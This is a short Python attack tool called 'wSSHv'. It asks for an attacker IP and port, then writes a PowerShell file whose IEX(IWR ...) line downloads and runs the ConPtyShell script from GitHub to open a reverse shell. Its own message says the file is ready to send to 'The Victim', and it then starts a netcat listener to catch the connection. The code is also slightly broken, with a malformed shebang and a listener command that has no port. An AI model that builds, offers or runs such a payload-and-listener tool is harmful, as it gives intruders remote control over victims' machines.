#!usr/bin/env python

import subprocess

# Welcome message!
print("""
                  < This tool been designd for YOU >
                              ___ ___ _  _     
                     __ __ __/ __/ __| || |_ __
                     \ V  V /\__ \__ \ __ \ V /
                      \_/\_/ |___/___/_||_|\_/ 1.0.0
        
       < Enter the Following Steps! To Create PowerShell File >
    """)

# input for ip and port!
ip_to_connect = input("Enter your IP --> ")
port_to_open = input("Enter any PORT --> ")
subprocess.getoutput("echo 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPty"
                      "Shell.ps1 -UseBasicParsing); Invoke-ConPtyShell " + ip_to_connect + " " + port_to_open + "' >> wSSHv.ps1")

# creating PowerShell file and start listening session messages!
print("\n[*] A File Has Been Created and Ready to Send it to The Victim!\n[*] Press Enter to start the listening..")

# calling netcat and filling out the user input to be ready for SSH listening session!
command = 'stty raw -echo; (stty size; cat) | nc -lvnp'
ret = subprocess.run(command, capture_output=True, shell=True)
print(ret.stdout.decode())

subprocess.call(["nc", "-lvnp", port_to_open, "-s", ip_to_connect])

